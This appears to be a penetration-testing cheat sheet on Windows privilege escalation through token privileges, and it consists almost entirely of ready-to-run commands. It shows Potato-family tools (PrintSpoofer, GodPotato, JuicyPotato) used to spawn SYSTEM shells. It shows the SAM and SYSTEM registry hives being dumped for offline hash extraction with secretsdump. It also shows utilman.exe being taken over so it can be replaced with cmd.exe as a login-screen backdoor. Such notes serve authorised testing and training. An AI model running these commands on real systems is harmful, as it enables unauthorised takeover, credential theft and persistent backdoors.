# Windows Token Impersonation

## SeImpersonatePrivilege
```cmd
whoami /priv
# If SeImpersonatePrivilege is enabled:

# PrintSpoofer (most common on modern Windows)
PrintSpoofer64.exe -i -c cmd.exe

# GodPotato / SharpEfsPotato (works on newer Windows)
GodPotato.exe -cmd "cmd.exe /c whoami"

# JuicyPotato (legacy - Windows 8/2012)
JuicyPotato.exe -l 1337 -p shell.exe -t *
```

## SeBackupPrivilege
```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive
# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## SeTakeOwnershipPrivilege
```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant user:F
# Replace with cmd.exe
```
